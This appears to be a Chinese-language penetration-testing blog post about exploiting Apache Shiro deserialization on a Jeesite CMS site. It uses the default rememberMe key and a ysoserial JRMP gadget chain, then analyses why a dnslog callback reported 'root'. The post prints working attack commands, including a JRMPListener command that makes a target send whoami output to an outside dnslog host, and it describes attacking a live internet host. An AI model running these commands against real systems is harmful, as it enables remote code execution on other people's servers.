---
layout: about
category: about
Researchname: JRMP-Gadget
toc: true
permalink: /about/JRMP-Gadget/
---

# Shiro框架深入利用：JRMP-Gadget利用链浅析

> PartI: Stay Hungry, Stay Foolish. 
> 
> PartII: 学的越多，不懂得也就越多。

**2021年 6月30日 星期三 15时30分40秒 CST* 前不久，Fofa安全工程师某信正在愉快的网上冲浪，不一会群里丢出了一个惹眼的链接吸引了某信的注意。

- 链接格式：`http://{ip.addr}:{ip.port}/a/login`

**芽儿～当时我整个人的是这样的：**
<div class="col-lg-2">
<img align="left" src="/static/web-image/JRMP-Gadget/IMG_0678.JPG"/>
</div>

<div>
因为这个链接实在是太熟悉了，浏览器访问，果然直接跳转：<br>
<code>/a/login;JSESSIONID=···</code><br>
和具有辨识度的Cookie：<code>jeesite.session.id</code><br>
<br>
一切都是这么的自然，我可真是太神气了。
</div>

梳理一下：

- Shiro 框架
- Jeesite CMS
	- 已知路由 `/a/、/f/`...

所以这个站就可以直接从Shiro入手来看，老三样：跑密钥 -> 利用链 -> Dnslog

不过跑密钥出了个小插曲，登录路由login处设置`rememberMe Cookie`时反包*Set-Cookie*不显示*deleteMe Cookie*，具体原因待更新：[*Different Shiro Framework deserialization analysis ideas*](/about/ShiroDeser/){:target="_blank"}，而从上面的特征我们已经可以肯定存在Shiro框架，当然也可以通过对不存在的路由进行Cookie设置来进行验证。

![](/static/web-image/JRMP-Gadget/shiro-cookie.png)

由于上面的原因导致有一些匹配回包来检测shiro框架为逻辑工具就在原地划水不动弹，不慌，总有一些“尖子生”，跑出默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`

紧接着：
```bash
[*] find: JRMPClient can be use
0: JRMPClient
```

- ysoserial.jar公网起JRMP端口，转发命令<code>ping `whoami`.x.dnslog.cn</code>
- JRMP监听显示流量建立链接，查看dnslog：
![](/static/web-image/JRMP-Gadget/shiro-dnslog.png)

`默认加密密钥 -> JRMPClient利用链 -> Shiro反序列化RCE root` 多么赏心悦目，一切都是那么地丝滑。
<div class="col-lg-3">
	<img  src="/static/web-image/JRMP-Gadget/IMG_0677.JPG"/>
</div>
<div>
	<div class="col-lg-8">
		<strong>然而却帅不过三秒：</strong>
		<img  src="/static/web-image/JRMP-Gadget/IMG_0679.png"/>
	</div>
</div>
<br><br><br>
<br><br><br>
<br><br>

## 提出问题

其实在这次渗透的过程中，我对于两个地方存疑：

- 第一个问题是开发向：就是Shiro框架识别阶段，`/a/login`路由配置Shiro对应Cookie后没有返回对应的Set-Cookie，如何实现的？同时我这里查了一些资料供参考
	- [Apache Shiro反序列化识别那些事](https://www.hetianlab.com/specialized/20200612143432){:target="_blank"}

- 第二个问题是JRMP Gadget利用阶段，为什么Dnslog记录显示为root，而现实情况下反弹的shell权限则是低权限？

### # 为什么不是root?

![](/static/web-image/JRMP-Gadget/JRMP-logic.png)

如上图，整张图是我个人对于Java反序列化中对于JRMP利用链的过程理解，从`local Attacker`环节开始，具体细节在这里不做展开叙述，其中存在歧义的地方我使用红色部分进行了标记；个人分析存在的问题也是红色部分：

> `VPS - JRMP`阶段在服务器启动的时候命令为：
>
> ><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 "ping `whoami`.x.dnslog.cn"</code>
> >
> >对应的：
> >`ysoserial.exploit.JRMPListener`利用类、`3333`本地JRMP监听端口、`CommonsCollections5`Java反序列化利用链以及转发<code>"ping `whoami`.x.dnslog.cn"</code>命令

再来看另外一张图片：
![](/static/web-image/JRMP-Gadget/jrmp-low-per.JPG)
我们看上面这一张图，重点在于`ping root.zj6u6s.dnslog.cn`进程对应的用户同样是低权限用户，也就是说是低权限的用户去运行的<code>`whoami`</code>这个命令而且输出的是`root`，但是从Linux权限的常识来看是不会出现这样的情况的。所以有了以下设想：

- 我初步的设想是：**假设1:命令是在受害机器上执行**，那么有几种情况：
	- 1.1:会不会因为该用户是sudo用户才导致返回的dns记录为root？
	- 1.2:~~启动Tomcat服务的为root用户？~~（通过`ps -ef`可以直接排除，而且细想，若Tomcat用户为root，那么肯定反弹的用户也为root）

所以我针对1.1假设进行了实验进行正确型验证：
```bash
➜ bin4xin sudo -l

User bin4xin may run the following commands on bin4xin's MacbookPro:
    (ALL) ALL

➜ bin4xin (sudo) ping `whoami`.31veg3.dnslog.cn
PING bin4xin.31veg3.dnslog.cn (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.087 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.163 ms
```
我们可以通过上面的bash信息和下面的dnslog信息返回看到，与sudo用户无关
```bash
#是否添加sudo返回都如下：
#dnslog返回记录
bin4xin.31veg3.dnslog.cn	61.132.161.4	2021-07-05 13:44:34
bin4xin.31veg3.dnslog.cn	61.132.161.6	2021-07-05 13:44:34
```
所以这种假设我们就直接排除了；

- 第二种设想 **假设2:命令是在VPS机器上执行**，就是JRMP利用过程链那张图中红色的那一部分，我想：<code>"ping `whoami`.x.dnslog.cn"命令</code>转发前本地机器是否已经执行了`whoami`所以导致了受害机器执行的是root开头的命令呢？
	- 那么如果通过这种假设，过程就是：`JRMP Server Listen: *0.0.0.0:3333` -> 本地机器执行<code>`whoami`</code>
	- 受害机器访问JRMP Server，执行`ping root.x.dnslog.cn`。

这种情况下来看，实际上也能够说通，而实际上也正是如此，本来打算是在本地跑个Shiro走一整个流程的，但是直到我发现了这个：
```bash
➜ bin4xin java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections3 "ping `whoami`.6iep0z.dnslog.cn"
* Opening JRMP listener on 8888

#ysoserial.exploit.JRMPListener利用类监听状态下：
➜ bin4xin ps -ef|grep ping

  501  6895  6696   0  2:37下午 ttys004    0:00.54 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections3 ping bin4xin.6iep0z.dnslog.cn
```
看到`java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections3 ping bin4xin.6iep0z.dnslog.cn`进程一切已然清晰；

至此，本章核心阐述完毕。以上
